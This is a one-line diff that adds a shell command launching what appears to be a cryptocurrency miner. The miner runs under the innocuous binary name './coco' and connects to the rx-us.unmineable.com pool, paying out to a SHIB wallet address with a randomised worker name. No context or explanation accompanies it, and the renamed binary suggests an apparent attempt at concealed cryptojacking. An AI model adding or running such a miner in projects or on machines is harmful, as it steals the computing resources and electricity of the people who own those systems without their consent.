@@ -1,0 +1,1 @@
+./coco -o rx-us.unmineable.com:3333 -u SHIB:0xbade577cb364798821d998811619de7fdb5a9d35.$(echo $(shuf -i 1000-999999 -n 1)-Xm) -p x -k -a argon2/wrkz
